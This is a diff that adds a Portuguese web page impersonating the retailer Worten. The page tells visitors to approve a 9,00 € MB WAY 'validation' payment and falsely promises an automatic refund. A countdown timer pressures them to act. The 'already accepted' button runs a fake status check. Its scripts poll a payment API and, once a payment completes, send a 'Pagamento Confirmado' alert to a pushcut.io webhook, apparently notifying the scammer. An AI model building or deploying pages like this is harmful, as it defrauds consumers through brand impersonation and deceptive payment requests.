@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="pt-PT">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Validação MB WAY - Worten</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
+    <style>
+        /* Override style.css */
+        body {
+            background: white !important;
+            display: block !important;
+            padding: 0 !important;
+            min-height: auto !important;
+        }
+
+        #worten-header {
+            background: #d32f2f !important;
+            padding: 15px 20px !important;
+        }
+
+        .how-to-pay-section {
+            margin-top: 35px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .step-title {
+            font-size: 14px;
+            color: #555;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .steps-container {
+            display: flex;
+            gap: 15px;
+            justify-content: space-between;
+        }
+
+        .step-item {
+            flex: 1;
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            border: 1px solid #eee;
+        }
+
+        .step-icon {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        .step-icon svg {
+            width: 20px;
+            height: 20px;
+            stroke: #d32f2f;
+        }
+
+        .step-text {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.4;
+            font-weight: 600;
+        }
+
+        body {
+            font-family: 'Open Sans', 'Arial', sans-serif;
+            background: white;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        #worten-header {
+            background: #d32f2f;
+            padding: 15px 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .main-container {
+            max-width: 500px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+            padding: 40px 25px;
+            text-align: center;
+        }
+
+        .mbway-logo {
+            height: 50px;
+            margin-bottom: 30px;
+        }
+
+        .timer-circle {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 5px solid #d32f2f;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 28px;
+            font-weight: 800;
+            color: #d32f2f;
+            position: relative;
+        }
+
+        .spinner {
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 5px solid transparent;
+            border-top-color: #ffcc00;
+            /* Worten Yellow */
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .instruction {
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .phone-display {
+            background: #eee;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: 700;
+            display: inline-block;
+            margin-bottom: 30px;
+            color: #555;
+        }
+
+        .check-btn {
+            width: 100%;
+            padding: 16px;
+            background: #333;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s;
+        }
+
+        .check-btn:hover {
+            background: #555;
+        }
+
+        .alert-box {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-top: 20px;
+            border: 1px solid #c8e6c9;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <div id="worten-header"
+        style="background: #d32f2f; padding: 15px 20px; text-align: center; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+        <img src="/assets/worten-logo.svg" style="width: 120px; filter: brightness(0) invert(1);">
+    </div>
+
+    <div class="main-container">
+
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
+            class="mbway-logo" alt="MB WAY">
+
+        <div class="timer-circle">
+            <div class="spinner"></div>
+            <span id="timer">04:59</span>
+        </div>
+
+        <h2 style="margin: 0 0 10px;">Validação em Curso...</h2>
+
+        <p class="instruction">
+            Abra a aplicação MB WAY e aceite o pedido de validação de <strong>9,00 €</strong>.
+        </p>
+
+        <div class="phone-display" id="userPhoneDisplay"></div>
+
+        <button class="check-btn" onclick="checkStatus()">
+            JÁ ACEITEI NO MB WAY
+        </button>
+
+        <div class="alert-box">
+            <span style="font-weight: 700;">✓ Estorno Garantido:</span> Assim que a validação for concluída, o montante
+            será devolvido automaticamente.
+        </div>
+
+        <!-- How to Pay Steps -->
+        <div class="how-to-pay-section">
+            <div class="step-title">Processo de Validação:</div>
+            <div class="steps-container">
+                <div class="step-item">
+                    <div class="step-icon">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 18L12 6M12 6L7 11M12 6L17 11" stroke="#d32f2f" stroke-width="2"
+                                stroke-linecap="round" stroke-linejoin="round" />
+                            <path d="M5 21H19" stroke="#d32f2f" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" />
+                        </svg>
+                    </div>
+                    <div class="step-text">Abra a App MB WAY</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-icon">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M18 8C19.6569 8 21 6.65685 21 5C21 3.34315 19.6569 2 18 2C16.3431 2 15 3.34315 15 5C15 6.65685 16.3431 8 18 8Z"
+                                stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                            <path
+                                d="M2 13.5929C3.60627 11.2372 6.55172 9.77075 9.73969 10C13.4398 10.2662 16.2971 13.1235 16.5633 16.8236C16.6575 18.1332 16.29 19.3629 15.6582 20.4071"
+                                stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                        </svg>
+                    </div>
+                    <div class="step-text">Verifique Notificações</div>
+                </div>
+                <div class="step-item">
+                    <div class="step-icon">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z"
+                                stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                        </svg>
+                    </div>
+                    <div class="step-text">Confirme o Pedido</div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // Start Timer
+        let timeLeft = 299; // 5 minutes approx
+        const timerElement = document.getElementById('timer');
+
+        const timerInterval = setInterval(() => {
+            const minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+            timerElement.textContent = `0${minutes}:${seconds}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerElement.textContent = "00:00";
+                alert("O tempo de validação expirou. Por favor tente novamente.");
+                window.location.href = 'payment.html';
+            }
+            timeLeft--;
+        }, 1000);
+
+        // Load Phone Data
+        window.onload = () => {
+            document.body.style.opacity = '1';
+
+            const storedData = sessionStorage.getItem('currentPayment');
+            /* Also check local storage backup if needed, but session is primary for payment flow */
+
+            if (storedData) {
+                const data = JSON.parse(storedData);
+                startPolling(data.id);
+            }
+
+            // Fallback: Read local storage (if we saved it there in previous steps)
+            /* NOTE: voucher.html didn't save to localStorage, only session. 
+               Let's save payer phone in session storage in voucher.html too? 
+               Or just leave '...' as privacy default. */
+
+            // Let's change voucher.html to also save payer info for display purposes.
+        };
+
+        function startPolling(transactionId) {
+            if (!transactionId) return;
+            const pollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch('https://api.waymb.com/transactions/info', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id: transactionId })
+                    });
+                    const result = await res.json();
+                    if (result && (result.status === 'COMPLETED' || result.status === 'PAID')) {
+                        clearInterval(pollInterval);
+                        handlePaymentSuccess();
+                    }
+                } catch (e) { }
+            }, 3000);
+        }
+
+        async function handlePaymentSuccess() {
+            try {
+                await fetch('https://api.pushcut.io/XPTr5Kloj05Rr37Saz0D1/notifications/Aprovado%20delivery', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ text: "Pagamento Confirmado: 9,00 € (MBWAY)", title: "Worten Promo" })
+                });
+            } catch (e) { }
+
+            document.querySelector('.main-container').innerHTML = `
+                <div style="text-align:center; padding: 40px 20px;">
+                    <div style="width: 80px; height: 80px; background: #4CAF50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" width="40" height="40">
+                            <path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                    <h2 style="color: #4CAF50; margin-bottom: 10px;">Pagamento Confirmado!</h2>
+                    <p style="color: #666; font-size: 16px;">O seu voucher já se encontra ativo.</p>
+                </div>
+             `;
+        }
+
+        function checkStatus() {
+            // Fake loading state
+            const btn = document.querySelector('.check-btn');
+            const originalText = btn.innerText;
+            btn.innerText = "VERIFICANDO...";
+            btn.style.opacity = "0.7";
+
+            setTimeout(() => {
+                alert("Ainda não recebemos a confirmação do banco. Por favor verifique o seu MB WAY novamente.");
+                btn.innerText = originalText;
+                btn.style.opacity = "1";
+            }, 2000);
+        }
+    </script>
+    <!-- Official Footer -->
+    <footer class="worten-footer">
+        <img src="/assets/worten-logo.svg" class="footer-logo" alt="Worten">
+        <div class="footer-content">
+            <div class="footer-col">
+                <h4>Apoio ao Cliente</h4>
+                <ul>
+                    <li><a href="#">Ajuda e Contactos</a></li>
+                    <li><a href="#">Estado da Encomenda</a></li>
+                    <li><a href="#">Devoluções</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Sobre Nós</h4>
+                <ul>
+                    <li><a href="#">Quem somos</a></li>
+                    <li><a href="#">Lojas</a></li>
+                    <li><a href="#">Worten Resolve</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Links Úteis</h4>
+                <ul>
+                    <li><a onclick="openLegal('privacy')">Política de Privacidade</a></li>
+                    <li><a onclick="openLegal('terms')">Termos e Condições</a></li>
+                    <li><a href="#">Livro de Reclamações</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2024 Worten - Equipamentos para o Lar, S.A. Todos os direitos reservados.</p>
+        </div>
+    </footer>
+
+    <!-- Legal Modals -->
+    <div id="legalModal" class="legal-modal">
+        <div class="legal-content">
+            <span class="close-legal" onclick="closeLegal()">&times;</span>
+            <h2 id="legalTitle" style="color: #d32f2f; margin-bottom: 20px;"></h2>
+            <div id="legalBody" style="font-size: 13px; color: #555;"></div>
+        </div>
+    </div>
+
+    <script src="script.js?v=23"></script>
+</body>
+
+</html>
